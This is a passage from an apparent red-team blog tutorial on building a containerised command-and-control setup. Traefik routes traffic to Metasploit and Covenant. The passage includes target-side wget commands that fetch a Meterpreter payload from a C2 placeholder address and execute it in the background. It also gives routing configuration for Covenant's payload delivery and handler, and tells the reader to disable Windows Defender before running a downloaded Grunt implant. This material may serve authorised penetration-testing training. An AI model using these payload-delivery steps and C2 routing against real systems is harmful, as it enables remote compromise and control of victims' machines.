If that fails for some reason, you can run <code>docker-compose down</code>.</p>
<p>🔹 In another shell on your Docker host, run:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker exec -it msf /bin/bash
bash-5.0&gt; ./msfconsole -r double_delivery.rc
</code></pre></div><p>You should now have a shell to your C2, with both delivery servers and associated handlers running.</p>
<p>In the output, you&rsquo;ll see the useful command to run directly on your target, that will fetch and execute the Meterpreter payload.<br>
In our case, you should see both the reverse_http and reverse_tcp commands, fetched using <code>wget</code>.</p>
<p><strong>We&rsquo;re going to change that final command to run on the target,</strong> remove the SRVPORT from the final URL.</p>
<p>🔹 On the target machine, run:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$  wget -qO httpPayload --no-check-certificate http://YOUR-C2-EXT-IP/delivery_http; chmod +x httpPayload; ./httpPayload&amp;
$  wget -qO tcpPayload --no-check-certificate http://YOUR-C2-EXT-IP/delivery_tcp; chmod +x tcpPayload; ./tcpPayload&amp;
</code></pre></div><p>You should now see your payloads calling home through Traefik.</p>
<p><a href="/assets/C2/MSFDelivery.png">
  <figure class="center" >
    <img src="/assets/C2/MSFDelivery.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Both HTTP and TCP Meterpreter delivered, and calling home - through Traefik</figcaption>
    
  </figure>

</a></p>
<p><em>Tip: You can quickly spawn a dedicated Linux target to run your payloads using Docker. On your host, run <code>docker run -it alpine sh</code> to get a quick shell to a small new Linux container.<br>
Your host might need to match the targeted architecture.</em></p>
<h3 id="monitoring-the-c2-routing-in-traefiks-web-interface">Monitoring the C2 routing in Traefik&rsquo;s web interface</h3>
<p>If you recall earlier, we activated Traefik&rsquo;s Web UI, with a route and a simple authentication using <code>test:test</code>.</p>
<p>🔹 Head to <code>http://YOUR-C2-EXT-IP/dashboard/#</code> to monitor all your live routes.</p>
<hr>
<h2 id="covenant-c2-setup-">Covenant C2 Setup 🔧</h2>
<p>Now that we&rsquo;ve successfully deployed our stack, let&rsquo;s deploy our second C2.<br>
To demonstrate Traefik&rsquo;s dynamic routing, we&rsquo;re going to build and deploy <a href="https://github.com/cobbr/Covenant">Covenant</a> as a container.</p>
<p>Let&rsquo;s first build the Covenant container. Unlike the Metasploit container, there is no official &ldquo;ready-made&rdquo; built container available on Docker Hub, so we&rsquo;ll build it ourselves.</p>
<p>Make sure you use a recursive clone, as it uses submodules.</p>
<p>🔹 Still in the <code>edgy-c2/</code> working directory, run:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ git clone --recurse-submodules https://github.com/cobbr/Covenant
$ docker build -t covenant Covenant/Covenant <span style="color:#75715e"># Give it a few minutes</span>
</code></pre></div><p>(<a href="https://github.com/cobbr/Covenant/wiki/Installation-And-Startup">source</a>)</p>
<p><strong>We&rsquo;re going to create a separate docker-compose yaml file that is meant to be used on the side</strong>, dedicated to bringing the built Covenant container into our existing C2 infrastructure.</p>
<p>We could use the <code>build</code> directive directly in our yaml file, but that would rebuild at launch. So we&rsquo;re building the container just once first, and spawning it second.</p>
<p>Since Covenant does not currently allow us to disable HTTPS for the Web UI, we&rsquo;ll have to use SSL passthrough on the TCP layer directly, instead of using Traefik&rsquo;s HTTP router. The web interface is really neat so we want that to work nicely.<br>
Fortunately, Traefik supports TCP routing as of version 2.<br>
That is why the <code>tls-ep</code> entry point is currently configured as a TCP router in Traefik&rsquo;s configuration.</p>
<p>We&rsquo;re adding three routes to the existing infrastructure:</p>
<ul>
<li><code>tls-ep</code> will now route to Covenant&rsquo;s web interface.</li>
<li><code>web-ep/cov_delivery</code> will route to Covenant&rsquo;s payload delivery web server.</li>
<li><code>web-ep/cov_handler</code> will route to Covenant&rsquo;s payload handler.</li>
</ul>
<p>Finally, we&rsquo;re asking Docker to hook the spawned service to the <code>edgy-c2_default</code> network generated by our previous docker-compose execution.</p>
<p>🔹 Open a new docker-compose file dedicated to Covenant:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ nano covenant-docker-compose.yml
</code></pre></div><p>🔹 Copy the following, save and exit:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-docker" data-lang="docker">version: <span style="color:#e6db74">&#34;3.7&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>services:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>  covenant:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    image: <span style="color:#e6db74">&#34;covenant&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    container_name: <span style="color:#e6db74">&#34;covenant&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    labels:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.enable=true&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># Web interface - host:443 to covenant:7443</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.routers.covenantUi.rule=HostSNI(`*`)&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.routers.covenantUi.service=covenantUi@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.services.covenantUi.loadbalancer.server.port=7443&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.tcp.routers.covenantUi.entrypoints=tls-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># HTTP Delivery - host/cov_delivery to covenant:80</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.covenantDelivery.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/cov_delivery`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantDelivery.service=covenantDelivery@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantDelivery.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.covenantDelivery.loadbalancer.server.port=80&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      <span style="color:#75715e"># HTTP Payload Handler - host/cov_handler to covenant:80</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;</span><span style="color:#e6db74">traefik.http.routers.covenantHandler.rule=Host(`</span>$C2EXTIP<span style="color:#e6db74">`) &amp;&amp; PathPrefix(`/cov_handler`)</span><span style="color:#e6db74">&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantHandler.service=covenantHandler@docker&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.routers.covenantHandler.entrypoints=web-ep&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      - <span style="color:#e6db74">&#34;traefik.http.services.covenantHandler.loadbalancer.server.port=80&#34;</span><span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>networks:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>  default:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>    external:<span style="color:#960050;background-color:#1e0010">
</span><span style="color:#960050;background-color:#1e0010"></span>      name: edgy-c2_default<span style="color:#960050;background-color:#1e0010">
</span></code></pre></div><p>🔹 Start our new service using:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">$ docker-compose -f covenant-docker-compose.yml up
</code></pre></div><p>You should see Traefik&rsquo;s logs picking up the new service. You can also check out your new routes and services by refreshing the Traefik web interface.</p>
<hr>
<h2 id="running-the-second-delivery-chain-">Running the second delivery chain 💥</h2>
<p>Head over to Covenant&rsquo;s web interface, located at <code>https://YOUR-C2-EXTERNAL-IP/</code>. Accept the unsigned certificate, fill out the username and password for the admin account.</p>
<p>🔹 Here&rsquo;s the configuration summary if you want to breeze through the interface:</p>
<ul>
<li>New <strong>Listener profile</strong>: add our routed payload session URI</li>
<li>New <strong>Listener</strong> with custom profile</li>
<li>New HTTP <strong>Binary Launcher</strong></li>
<li>Enable hosting of generated <strong>Grunt</strong> with our routed payload delivery URI</li>
<li>Fetch payload on target using routed delivery URI</li>
<li>Execute</li>
</ul>
<p>🔹 Here are the detailed steps:</p>
<ol>
<li><strong>Create a new Listener profile.</strong></li>
</ol>
<p><a href="/assets/C2/cov1.png">
  <figure class="center" >
    <img src="/assets/C2/cov1.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Step 1^</figcaption>
    
  </figure>

</a></p>
<ol start="2">
<li><strong>Select and edit the CustomHttpProfile.</strong>
<ul>
<li>Give it a new name</li>
<li>Replace or add the <code>/cov_handler</code> URI to the HttpUrls
<ul>
<li>example: <code>/cov_handler/index.html?page={GUID}&amp;v=1</code></li>
</ul>
</li>
<li>To save, use the blue &ldquo;Edit&rdquo; button at the bottom of the page</li>
</ul>
</li>
</ol>
<p><a href="/assets/C2/cov2.png">
  <figure class="center" >
    <img src="/assets/C2/cov2.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Step 2^</figcaption>
    
  </figure>

</a></p>
<ol start="3">
<li><strong>Create a new Listener using the new profile.</strong>
<ul>
<li>Replace the ConnectAddress with your C2&rsquo;s IP</li>
<li>Disable SSL</li>
<li>Launch</li>
</ul>
</li>
</ol>
<p><a href="/assets/C2/cov3.png">
  <figure class="center" >
    <img src="/assets/C2/cov3.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Step 3^</figcaption>
    
  </figure>

</a></p>
<ol start="4">
<li><strong>Create a new Binary Launcher.</strong>
<ul>
<li>Select the Listener profile we created</li>
<li>Select the GruntHTTP template</li>
<li>Disable everything Cert for our test</li>
<li>Generate</li>
</ul>
</li>
</ol>
<p><a href="/assets/C2/cov4.png">
  <figure class="center" >
    <img src="/assets/C2/cov4.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Step 4^</figcaption>
    
  </figure>

</a></p>
<ol start="5">
<li><strong>Still in the Binary Launcher menu.</strong>
<ul>
<li>Go to the Host tab</li>
<li>Enter <code>/cov_delivery/grunt.exe</code> in the URL field</li>
<li>Select the blue &ldquo;Host&rdquo; button</li>
</ul>
</li>
</ol>
<p><a href="/assets/C2/cov5.png">
  <figure class="center" >
    <img src="/assets/C2/cov5.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Step 5^</figcaption>
    
  </figure>

</a></p>
<ol start="6">
<li><strong>Switch to your Windows target.</strong>
<ul>
<li>Download binary from <code>http://YOUR-EXT-C2-IP/cov_delivery/grunt.exe</code></li>
<li>Make sure Windows Virus &amp; Threat protections are all off, as Windows flags the default Covenant binaries</li>
<li>Launch binary</li>
</ul>
</li>
</ol>
<p><a href="/assets/C2/cov6.png">
  <figure class="center" >
    <img src="/assets/C2/cov6.png"   style="border-radius: 16px;"  />
    
  </figure>

</a>
<a href="/assets/C2/cov7.png">
  <figure class="center" >
    <img src="/assets/C2/cov7.png"   style="border-radius: 16px;"  />
    
      <figcaption class="center" >Done.</figcaption>
    
  </figure>

</a></p>
<p>You should now see your Grunt calling back home through the route we configured, and available to interact within the Grunts menu.<br>
Use CTRL+C or <code>docker-compose -f covenant-docker-compose.yml down</code> to stop the Covenant C2.</p>
<p>⭐ 🎉 <strong>Well done! You now have a fully functional elastic C2 infrastructure!</strong> 🎉 ⭐</p>
<p>Now&rsquo;s the time to take a break, you&rsquo;ve earned it.<br>
Take a minute to contemplate your success, and the new paths you have opened to your upcoming adventures.</p>
<p><img src="https://media.giphy.com/media/IbmVEYuOKVgvDndnf7/giphy.gif" alt=""></p>
<p>🐚 💛 💀 💚 🐚 💙 💀 💜 🐚</p>
<p><em>I hope you had a good time.</em><br>
<em>If you enjoyed this post, you can <a href="https://twitter.com/kh4st3x">follow me on Twitter</a> to stay updated.</em><br>
<em>Cheers!</em></p>
<p><em>k</em></p>
<p>🐚 💛 💀 💚 🐚 💙 💀 💜 🐚</p>
<h2 id="notes">Notes</h2>
<p>Related subjects we have not covered in this post, for those who want to go further down the rabbit-hole 🐇:</p>
<ul>
<li>Using HTTPS with handlers and web interfaces behind Traefik</li>
<li>Using Let&rsquo;s Encrypt automation</li>
<li>Persistent data with shared volumes</li>
<li>Traefik metrics to dashboards</li>
<li>Payload delivery with additional rules (target platform, payload keying)</li>
<li>Load balancing &amp; scaling</li>
<li>Expanding the infrastructure with Docker swarm or AWS Beanstalk</li>
<li>Routing evasion techniques</li>
</ul>

    </div>
    
    

    
      
    
    
    </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a href="/" class="logo" style="text-decoration: none;">
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367"/>
</svg>
</span>
    <span class="logo__text">khast3x blog</span>
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span>© 2020 Powered by <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span>
        <span>Theme created by <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span>
      </div>
    
  </div>
</footer>

<script src="https://khast3x.club/assets/main.js"></script>
<script src="https://khast3x.club/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
